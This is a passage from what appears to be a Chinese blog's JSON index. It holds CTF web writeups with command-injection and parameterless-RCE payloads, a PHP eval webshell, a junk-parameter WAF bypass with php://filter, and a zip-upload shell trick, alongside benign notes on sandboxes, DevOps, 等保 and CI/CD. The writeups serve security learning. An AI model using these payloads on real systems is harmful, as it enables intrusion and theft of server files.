字符串，这里用到了[]通配的形式，由于黑名单中有A和L这两个字符，因此构造F[D-Z][@-Z]G，这样就能匹配上ASCII表中的@到Z之间的所有字符。\n这种[]通配符还是很少见的，当?和*被ban了之后还是很好用的\n最后是空格的绕过，这里用到了%09\npayload：myfavorite=mewtwo&amp;dream=od%09-c%09/F[D-Z][@-Z]G\n\n会出来flag\n\n\n但是这样格式是不对的\n\n我测试了一下这样是有地址的，所以我们需要删除0000020和00000040\nok\n[强网杯 2019]高明的黑客跑脚本的以前复现过现在不搞了\n[强网杯 2019]upload环境是坏的，文件传不上去\n","categories":["writeups"],"tags":["文件上传","sql","堆叠注入","od"]},{"title":"无参数rce","url":"/2023/05/11/%E6%97%A0%E5%8F%82%E6%95%B0rce/","content":"前言在鹏程杯中发现有无参数rce，发现自己基础很差很差，特此学习记录一下。参考文文章：https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE\n使用无参数函数的原因这里是因为有很离谱的过滤\n原本正常来说我们看到eval($_POST[‘cmd’]);\n就可以传入利用了，但是这里前面加上了这样的过滤\nif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;cmd&#x27;])) &#123;        eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n\n(?R)?尤其注意这个特征点，是一个递归的匹配\n如果输入的是system(‘ls’)这样的有参数函数，正则匹配就会匹配不到，从而没有替换为空，那么&#x3D;&#x3D;&#x3D;’;’的条件就无法满足。\n只有a();、a(b(c()));这样的格式才能够被匹配。\n上面这个正则就是明显的过滤参数，只允许无参数函数的表现。\n超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。\nPHP 超级全局变量列表:$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\n注意一个超级全局变量$_ENV\n这可以当作是一个环境变量的集合\n这里面有很多可以使用的无参函数\ngetenv()\narray_rand()\narray_filp()\n等等\n注意一个\ngetallheaders()\n这个可以获得所有的消息头信息\n&lt;?phpvar_dump(getallheaders());?&gt;结果：array(13) &#123;  [&quot;Content-Length&quot;]=&gt;  string(1) &quot;0&quot;  [&quot;Cookie&quot;]=&gt;  string(85) &quot;_ga=GA1.1.125883784.1603376093; Phpstorm-b0ddb94=486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;  [&quot;Accept-Language&quot;]=&gt;  string(47) &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;  [&quot;Accept-Encoding&quot;]=&gt;  string(17) &quot;gzip, deflate, br&quot;  [&quot;Sec-Fetch-Dest&quot;]=&gt;  string(8) &quot;document&quot;  [&quot;Sec-Fetch-User&quot;]=&gt;  string(2) &quot;?1&quot;  [&quot;Sec-Fetch-Mode&quot;]=&gt;  string(8) &quot;navigate&quot;  [&quot;Sec-Fetch-Site&quot;]=&gt;  string(4) &quot;none&quot;  [&quot;Accept&quot;]=&gt;  string(124) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;  [&quot;User-Agent&quot;]=&gt;  string(131) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51&quot;  [&quot;Upgrade-Insecure-Requests&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;Host&quot;]=&gt;  string(15) &quot;localhost:63342&quot;  [&quot;Content-Type&quot;]=&gt;  string(0) &quot;&quot;&#125;---------------------------------Author: A1andNSArticle is from: https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCEThis content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)\n\n这样我们可以加入我们的恶意代码\n\n","categories":["知识总结"],"tags":["无参RCE"]},{"title":"沙箱初识","url":"/2023/08/07/%E6%B2%99%E7%AE%B1%E5%88%9D%E8%AF%86/","content":"定义沙箱：是桌面运行环境的虚拟镜像系统，用来深度检测可疑文件。当对未知的可疑文件分析时，有时我们需要实际运行它，并记录他的一切行为，进而对其进行分析，就需要用到沙箱。\n（1）沙箱是桌面运行环境的虚拟镜像系统，包括：配置、驱动、应用、语言；\n（2）接受来自安全联动产品的可疑对象：例如可疑URL、文档文件、可执行文件；\n（3）可以自动执行针对可疑文件及URL的分析检测；\n（4）生成详细的报告，并告知不同的风险级别。\n沙箱优势1.经济便携\n2.高度可视化\n沙箱制作原理沙箱内万物基于重定向\n重定向，就是重新指定方向，沙箱能够做到让沙箱内软件的操作的文件，注册表等重要路径重定向到其他地方，你想操作资源不可以\n这个重定向是怎么做到的呢？\n看段代码\nNTSTATUS HOOK_ZwDeleteFile(  POBJECT_ATTRIBUTES ObjectAttributes) &#123;   AddPrefix(ObjectAttributes-&gt;ObjectName, L&quot;sandbox&quot;);//路径加上沙箱前缀   if(!PathFileExists(ObjectAttributes-&gt;ObjectName.Buffer)) &#123;      CopyFile();//拷贝进来   &#125;   return OrigZwDeleteFile(ObjectAttributes);&#125;\n\n简单来说就是在文件的前面加一个sandbox路径\n一个完备的沙箱一般需要虚拟化（隔离）处理这些东西：\n\n文件\n注册表\nDCOM(RPCSS)\n服务\n其他如：窗口、类名、消息、token等。\n进程、线程安全\n全局钩子、注入等防护\n驱动加载\n\n","categories":["工作"],"tags":["work"]},{"title":"浅谈Devops","url":"/2023/08/07/%E6%B5%85b%E8%B0%88Devops/","content":"定义DevOps（Development和Operations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。透过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。\n思考在我眼中这里更像是一种开发方式，Devops不是简单的一个软件，几个人就做出来的，它应该是一种思想观察到开发的全过程中\n这个过程中有很多厂商都做出了很多优质平台\n软件开发的发展大概是从瀑布式到敏捷式再到现在的Devops\nDevops大概是在一个平台上，所有的设计，开发，测试，发布所有人都在一个规范下进行活动，严格按照规范进行项目推进\n","categories":["工作"],"tags":["work"]},{"title":"网络安全基础知识-等保是什么","url":"/2023/08/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E7%AD%89%E4%BF%9D%E6%98%AF%E4%BB%80%E4%B9%88/","content":"等保到底是什么？1、降低信息安全风险，提高信息系统的安全防护能力；\n2、满足国家相关法律法规和制度的要求；\n3、满足相关主管单位和行业要求；\n4、合理地规避或降低风险。\n等保具体包括什么内容(1)定级\n邀请几个网络安全专家，根据信息安全等级保护定级相关指南结合企业信息系统进行评估定级，并出具定级专家意见。\n\n(2)备案\n通过备案工具填写完整系统表单,然后将全部材料一起送到所在地市公安局网安支队进行备案，这个过程正常需要十个工作日完成。\n(3)安全建设整改\n根据客户的实际情况进行差距分析，针对不符合的项目以及行业特征进行整改。\n(4)信息安全等级测评\n信息系统安全等级测评是验证信息系统是否满足相应安全保护等级的评估过程。\n说人话就是，给客户打分，评分的。\n(5)信息安全检查\n根据客户需要配合完成的自查工作，按照规章制度的要求落实完成自查流程。\n等保分为几个级别\n什么群体&#x2F;行业需要开展等保（1）政府机关：电子政务网络；\n（2）金融行业：监管机构，银行，保险公司等；\n（3）电信行业：各大运营商；\n（4）能源行业：电力（比如xxx电网），石油等；\n（5）互联网单位：各大企业，上市公司等；\n","categories":["工作"],"tags":["work"]},{"title":"网络安全知识基础-CI/CD","url":"/2023/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80-CI-CD/","content":"什么是 CI&#x2F;CD？概念：CI&#x2F;CD 是一种通过在[应用开发](https://www.redhat.com/zh/topics/devops/[[url-nid:307771;title:&#39;article | why choose red hat for cloud-native development?’])阶段引入自动化来频繁向客户交付应用的方法。CI&#x2F;CD 的核心概念是持续集成、持续交付和持续部署。\n思考:众所周知，产品的出现基本上要不断的迭代版本，我的理解就是CI&#x2F;CD可以加快版本的更迭\nCI&#x2F;CD 可让持续自动化和持续监控贯穿于应用的整个生命周期（从集成和测试阶段，到交付和部署）。这些关联的事务通常被统称为“CI&#x2F;CD 管道”，由开发和运维团队以敏捷方式协同支持，采用的方法不是 DevOps 就是站点可靠性工程（SRE）。\nCI 和 CD 有什么区别？CICI指的是始终持续集成，属于开发人中的自动化流程。一个成功的CI表明应用代码的新的更新会定期构建，测试合并共享到存储库当中。这样的好处是可以避免一次开发中有太多的应用分支，从而导致相互冲突的问题。\nCD持续交付或者说持续部署，这两种说法都事关管道后续阶段的自动化\n持续交付指开发人员对应用的更改会自动进行错误测试并上传到存储库，比如github或者容器注册表，然后由运维团队部署到实时生产环境中。解决开发和运维团队中可见性及沟通较差的问题。这个持续交付的目的就是确保尽可能的减少部署新代码时所需的工作量。\n持续部署指的时自动将开发人员的更改从存储库发布到生产环境，让客户使用。主要为了解决手动流程降低应用交付的速度，从而使运维团队减轻工作\nCI&#x2F;CD并不是一个固定的含义，可以理解为这是一个流程，可以形象的比喻成为一个管道，用于实现应用开发中的高度持续自动化和持续监控\n工具比较著名的开源工具就是jenkins，ci到cd都可以处理\n","categories":["工作"],"tags":["work"]},{"title":"羊城杯","url":"/2023/05/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF/","content":"[羊城杯 2020]easycon以前好像做过，现在还是很无语\n\n就是随便试了一下index.php\n然后就可以了\n\n命令执行\n\n这里面的东西base64转图片\n\n受不了一点\n[羊城杯 2020]easyphp &lt;?php    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; \n\n代码审计\n利用点在最后\nfile_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n\n\n读入我们传入文件名和数据，然后去利用\n一点一点看这里是怎么保护的\nforeach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125; \n\n删除除了index.php外的所有的文件\nif(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;       highlight_file(__FILE__);       die();   &#125; \n\n接受content和filename两个变量，不然就寄\n$content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125; \n\n分别对content和filename两个变量进行过滤\nstristr函数就是返回这些东西之前的内容\nhttps://www.php.cn/faq/414974.html#:~:text=PHP,stristr%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%A8%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%BC%80%E5%A7%8B%E4%BD%8D%E7%BD%AE%E5%88%B0%E7%BB%93%E6%9D%9F%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%EF%BC%8C%E5%85%B6%E8%AF%AD%E6%B3%95%E6%98%AFstristr%20%28string%2Csearch%2Cbefore_search%29%EF%BC%8C%E5%8F%82%E6%95%B0string%E5%BF%85%E9%9C%80%EF%BC%8C%E6%98%AF%E8%A7%84%E5%AE%9A%E8%A2%AB%E6%90%9C%E7%B4%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9Bsearch%E5%BF%85%E9%9C%80%EF%BC%8C%E6%98%AF%E8%A7%84%E5%AE%9A%E8%A6%81%E6%90%9C%E7%B4%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82\n\npreg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1\n\n这个就是不能有小写字母和 .外的所有东西\n但是我们想要得到他服务器上的flag文件又该怎么做呢\npayload:\nfilename=flag.php&amp;content=&lt;?php eval($_GET[1]);?&gt;\n\n\n没有用被输出了\n","categories":["writeups"],"tags":["反序列化","java",".htaccess","数组绕过","SSRF","disable_function"]},{"title":"鹏城杯2022","url":"/2023/05/09/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022/","content":"[鹏城杯 2022]简单包含emmmm，应该是商用的最简单的waf，使用脏数据绕过\npayload：1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php\n\n\n用脏数据是waf绕过常用手段\n[鹏城杯 2022]简单的php&lt;?phpshow_source(__FILE__);    $code = $_GET[&#x27;code&#x27;];    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;,$code))&#123;        die(&#x27; Hello&#x27;);    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123;        @eval($code);    &#125;?&gt; \n\n很明显的无字符rce\n虽然说之前总结了，但是这次实战还是写不出来\n\n再根据这道题总结一下\n参考文章：https://www.cnblogs.com/0xo0Kerk/p/17236536.htmlhttps://blog.csdn.net/Manuffer/article/details/120738755\n\n学习一下什么是无参数RCE，现在才明白RCE中好像有无参数和无字符\n&lt;?php\tif(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])&#123; \t\t     eval($_GET[&#x27;exp&#x27;]);\t&#125;?&gt;\n\n看下这段代码，\n一点一点进行审计。\n‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[a-z,_]+((?R)?)&#x2F;‘这个如果对了，就执行 $_GET[‘exp’]，然后eval($_GET[‘exp’]);\n[a-z,_]匹配小写字母和下划线 +表示1到多个\n(?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。\n(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。\n大概是可以理解了\n\n再回头看这道题，就应该是无字母加上无参数rce一起上来\n我们先测试一下可用字符\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n\n有百分号和~\n取反\n&lt;?php$a=&quot;phpinfo&quot;;var_dump(urlencode(~$a));\n\n测试一手phpinfo\n\n一切都很顺利\n\n接下来开始准备rce\nsystem(current(getallheaders()));我们利用这一套修改信息头进行rce\n\n这里不断用脚本进行取反，然后%!FF或者!%FE都是为了给一个合法的函数名去补充，不然我们取反的函数字符字符串会被当作不合法的传入\n\n结束\n[鹏城杯 2022]压缩包 &lt;?phphighlight_file(__FILE__);function removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;function unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();        $zip-&gt;open($filename);        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;        if($zip-&gt;extractTo($dir))&#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);    ?&gt;[]Warning: mkdir(): No such file or directory in /var/www/html/index.php on line 21[][]\n\n开局很复杂吓人的源码\n代码审计\nfunction removedir($dir)&#123;    $list= scandir($dir);    foreach ($list as  $value) &#123;       if(is_file($dir.&#x27;/&#x27;.$value))&#123;         unlink($dir.&#x27;/&#x27;.$value);       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir.&#x27;/&#x27;.$value);       &#125;    &#125;&#125;\n\nscandir这个函数\n\n得到一个list\n然后去删除这些list里面的东西\n还有一个函数unzip($filename)\n待会分析\n$content= $_REQUEST[&#x27;content&#x27;];shell_exec(&#x27;rm -rf /tmp/*&#x27;);$fpath =&quot;/tmp/&quot;.md5($content); file_put_contents($fpath, base64_decode($content));echo unzip($fpath);\n\n这是主要思路\n传入一个content\n然后删除tmp目录下面的所有东西，但是tmp目录还是在的\n/tmp/ 是一个 Linux&#x2F;Unix 系统中的临时目录，常用于存放临时文件，通常这些文件在系统重启时会被清空。\n然后他把$content经过md5后的文件名放到tmp文件路径下\n将 $content 变量中的 Base64 编码解码后，将结果写入到 $fpath 变量所代表的文件中，使用 PHP 内置函数 file_put_contents() 实现。具体的实现过程如下：\n\nbase64_decode($content) 将 $content 变量中的 Base64 编码解码成二进制数据\n\nfile_put_contents($fpath, ...) 将解码后的二进制数据写入到 $fpath 文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。\n\n\n最后echo了unzip函数里面的$fpath\n看看unzip函数\nfunction unzip($filename)&#123;        $result = [];        $zip = new ZipArchive();//创建一个 ZipArchive 类的实例        $zip-&gt;open($filename);//打开，没有就创建        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);//在/static/upload/服务器的目录下面存入md5加密后的$filename        if(!is_dir($dir))&#123;            mkdir($dir);        &#125;// 没有就创造        if($zip-&gt;extractTo($dir))//解压zip到dir        &#123;        foreach (scandir($dir) as  $value) &#123;            $file_ext=strrchr($value, &#x27;.&#x27;);            $file_ext=strtolower($file_ext); //转换为小写            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA            $file_ext=trim($file_ext); //收尾去空            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;                removedir($dir);            &#125;            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;                if(is_file($dir.&quot;/&quot;.$value))&#123;                    unlink($dir.&quot;/&quot;.$value);                &#125;else&#123;                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)                    array_push($result,$value);                &#125;                            &#125;                   &#125;        $zip-&gt;close();        unlink($filename);//unlink($filename) 方法用于删除 ZIP 文件，因为已经解压完成，ZIP 文件已经不需要了。        return json_encode($result);        &#125;else&#123;            return false;        &#125;    &#125;\n\n$zip = new ZipArchive(); 的作用是创建一个 ZipArchive 类的实例，以便使用该类提供的方法进行 ZIP 归档文件的操作。\n\nopen()：打开一个 ZIP 归档文件，如果文件不存在则创建它。\n\n分析完了什么都不懂。没有找到任何可用的点\n接下来是付神教我的方法。\n有一个p神博客：https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html\n思路是创造一个zip，然后让这个zip里面包含一个shell，但是解压的时候会出错，只能解压出shell.php\n为什么呢，这段源码经过审计，发现没有递归删除文件，也没有删除文件夹。\n具体操作\n\n\nhttps://www.yuque.com/zouyii/kteg8l/pnk84i4h17wfdhag#8f05a9f3\n","categories":["writeups"],"tags":["无参RCE","脏数据","取反构造","条件竞争","变量覆盖","路径穿越"]}]